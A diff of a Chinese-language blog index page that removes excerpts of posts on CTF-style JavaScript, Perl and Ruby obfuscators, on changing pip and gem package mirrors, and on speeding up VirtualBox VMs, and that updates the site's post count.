-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:40:24+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/CTF中那些有趣的混淆/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/CTF中那些有趣的混淆/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/CTF中那些有趣的混淆/" class="leancloud_visitors" data-flag-title="CTF中那些有趣的混淆">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>​    ppencode/rrencode/jjencode/aaencode是Perl、Ruby、Javascript的小工具，可以将各自的代码进行混淆，转换成特殊字符，甚至还可以转换成有意思的表情。</p>
-<h4 id="ppencode-Perl"><a href="#ppencode-Perl" class="headerlink" title="ppencode-Perl"></a>ppencode-Perl</h4><p>台湾的Perl达人<a href="http://pugs.blogs.com/" target="_blank" rel="external">唐鳳</a>在<a href="http://yapcasia.org/2010/" target="_blank" rel="external">YAPC</a>曾经介绍过<a href="http://www.slideshare.net/autang/ppencode" target="_blank" rel="external">ppencode</a>，它可以把Perl代码转换成只有英文字母的字符串。</p>
-<p>下面是转换示例：</p>
-<p>Demo的地址：<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="external">http://namazu.org/~takesako/ppencode/demo.html</a>。</p>
-<h4 id="rrencode-Ruby"><a href="#rrencode-Ruby" class="headerlink" title="rrencode-Ruby"></a>rrencode-Ruby</h4><p>rrencode可以把ruby代码全部转换成符号。</p>
-<p>下面是转换示例：</p>
-<p>项目地址：<a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="external">http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html</a>。</p>
-<h4 id="jjencode-aaencode-Javascript"><a href="#jjencode-aaencode-Javascript" class="headerlink" title="jjencode/aaencode-Javascript"></a>jjencode/aaencode-Javascript</h4><p><a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="external">jjencode</a>和aaencode都是<a href="http://twitter.com/#!/hasegawayosuke" target="_blank" rel="external">Yosuke HASEGAWA</a>的作品，前者将JS代码转换成只有符号的字符串，类似于rrencode，介绍的PPT见<a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="external">http://utf-8.jp/public/20090710/jjencode.pps</a>。</p>
-<p>后者更好玩，可以将JS代码转换成常用的网络表情，例如“(ﾟΘﾟ)”。示例如下：</p>
-<p>Demo的地址是：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="external">http://utf-8.jp/public/aaencode.html</a>，转换的代码并不复杂，可以在源代码里看到。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/pip源的修改/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/pip源的修改/" itemprop="url">
-                  pip源的修改
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:37:55+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/pip源的修改/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/pip源的修改/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/pip源的修改/" class="leancloud_visitors" data-flag-title="pip源的修改">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="1-在windows环境下修改pip镜像源的方法-以python3-5为例"><a href="#1-在windows环境下修改pip镜像源的方法-以python3-5为例" class="headerlink" title="1:在windows环境下修改pip镜像源的方法(以python3.5为例):"></a>1:在windows环境下修改pip镜像源的方法(以python3.5为例):</h4><p>(1):在windows文件管理器中,输入 %APPDATA%</p>
-<p>(2):会定位到一个新的目录下，在该目录下新建pip文件夹，然后到pip文件夹里面去新建个pip.ini文</p>
-<p>(3):在新建的pip.ini文件中输入以下内容，搞定</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="section">[global]</span></div><div class="line"><span class="attr">timeout</span> = <span class="number">6000</span></div><div class="line"><span class="attr">index-url</span> = http://pypi.douban.com/simple</div><div class="line"><span class="attr">trusted-host</span> = pypi.douban.com</div></pre></td></tr></table></figure>
-<h4 id="2：在linux系统中更新pip源的方式-以centos-python2-7为例"><a href="#2：在linux系统中更新pip源的方式-以centos-python2-7为例" class="headerlink" title="2：在linux系统中更新pip源的方式(以centos,python2.7为例)"></a>2：在linux系统中更新pip源的方式(以centos,python2.7为例)</h4><p>在linux环境下的修改方式和在windows环境下修改方式基本相同，这里简单总结一下:</p>
-<p>(1):在用户的家目录下面创建名为.pip文件夹</p>
-<p>(2):在创建好的.pip文件夹中创建名为pip.conf的文件</p>
-<p>(3):在pip.conf文件中输入以下内容，ok!!!</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="section">[global]</span></div><div class="line"><span class="attr">timeout</span> = <span class="number">6000</span></div><div class="line"><span class="attr">index-url</span> = http://pypi.douban.com/simple</div><div class="line"><span class="attr">trusted-host</span> = pypi.douban.com</div></pre></td></tr></table></figure>
-<h4 id="3：macOS更改pip源"><a href="#3：macOS更改pip源" class="headerlink" title="3：macOS更改pip源"></a>3：macOS更改pip源</h4><p>在终端进入目录：<code>cd ~/</code></p>
-<p>如果没有 .pip 文件夹，那么就要新建这个文件夹，<code>mkdir .pip</code></p>
-<p>然后在.pip 文件夹内<code>vim pip.conf</code>，</p>
-<p>写入阿里云</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="section">[global]</span></div><div class="line"></div><div class="line"><span class="attr">index-url</span> = http://mirrors.aliyun.com/pypi/simple/</div><div class="line"><span class="section"></span></div><div class="line">[install]</div><div class="line"></div><div class="line"><span class="attr">trusted-host</span>=mirrors.aliyun.com</div></pre></td></tr></table></figure>
-<p>或者可以使用豆瓣的镜像：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="section">[global]</span></div><div class="line"></div><div class="line"><span class="attr">index-url</span> = http://pypi.douban.com/simple</div><div class="line"><span class="section"></span></div><div class="line">[install]</div><div class="line"></div><div class="line"><span class="attr">trusted-host</span>=pypi.douban.com</div></pre></td></tr></table></figure>
-<p>好了现在你可以体验快的飞起的pip了。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/你会用你的虚拟机吗-一/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/你会用你的虚拟机吗-一/" itemprop="url">
-                  你会用你的虚拟机吗?(一)
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:29:45+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/你会用你的虚拟机吗-一/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/你会用你的虚拟机吗-一/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/你会用你的虚拟机吗-一/" class="leancloud_visitors" data-flag-title="你会用你的虚拟机吗?(一)">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>怎么可以让你的虚拟机运行的更快呢？</p>
-<h4 id="1、开启CPU的硬件虚拟化功能"><a href="#1、开启CPU的硬件虚拟化功能" class="headerlink" title="1、开启CPU的硬件虚拟化功能"></a>1、开启CPU的硬件虚拟化功能</h4><p>现在的CPU几乎都支持硬件虚拟化功能，英特尔称之为VT-x技术，AMD称之为AMD-V技术。在百度搜索你的笔记本型号或主板型号+开启虚拟化，就可以找到相应的开启方法。一般是开机进入bios，然后找到虚拟化技术的选项，将disabled改为enabled。据我所知，用英特尔CPU的电脑，虚拟化技术的选项名称大概含有“virtualization technology”的字眼。</p>
-<p>BIOS开启成功后，在虚拟机的设置中，启用硬件加速。</p>
-<p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-1.png" alt="1"></p>
-<p>当你成功开启硬件虚拟化功能时，虚拟机的窗口右下角有一个蓝色V的图标，鼠标移上去就会提示成功开启。</p>
-<h4 id="2、给虚拟机分配足够的内存"><a href="#2、给虚拟机分配足够的内存" class="headerlink" title="2、给虚拟机分配足够的内存"></a>2、给虚拟机分配足够的内存</h4><p>既然本机有4GB的内存，那么可以分配1GB供虚拟机上的Ubuntu使用。内存大小根据虚拟机系统的需要来定，如果你跑XP，那么分配512MB已经很足够了。</p>
-<p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-2.png" alt="2"></p>
-<h4 id="3、开启3D加速，分配足够显存"><a href="#3、开启3D加速，分配足够显存" class="headerlink" title="3、开启3D加速，分配足够显存"></a>3、开启3D加速，分配足够显存</h4><p>笔者觉得当初Ubuntu界面卡顿很有可能跟显卡方面的设置有关。于是开启了3D加速，分配了32MB的显存给VirtualBox。性能提升很明显。</p>
-<p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-3.png" alt="3"></p>
-<h4 id="4、安装VirtualBox增强功能"><a href="#4、安装VirtualBox增强功能" class="headerlink" title="4、安装VirtualBox增强功能"></a>4、安装VirtualBox增强功能</h4><p>启动虚拟机。单击虚拟机菜单中的“设备”&gt;“安装增强功能”，也可以按快捷键Host+D。Host键就是虚拟机窗口右下方显示的键，默认为Right Ctrl，即右边的Ctrl键。然后系统会加载增强功能所在的虚拟光盘。点击运行，按提示完成安装，重启虚拟机。</p>
-<h4 id="5、电脑的核心都挺多的"><a href="#5、电脑的核心都挺多的" class="headerlink" title="5、电脑的核心都挺多的"></a>5、电脑的核心都挺多的</h4><p>多分个核就好了。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/gem更换国内源/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/gem更换国内源/" itemprop="url">
-                  gem更换国内源
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:26:43+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/gem更换国内源/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/gem更换国内源/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/gem更换国内源/" class="leancloud_visitors" data-flag-title="gem更换国内源">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">gem sources -l</div><div class="line"></div><div class="line">#移除https://rubygems.org源</div><div class="line"></div><div class="line">gem sources --remove https://rubygems.org/</div><div class="line"></div><div class="line">#增加https://gems.ruby-china.org/源</div><div class="line"></div><div class="line">gem sources -a https://gems.ruby-china.org/</div><div class="line"></div><div class="line">#更新缓存</div><div class="line"></div><div class="line">gem sources -u</div></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1876,7 +1948,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-count">30</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
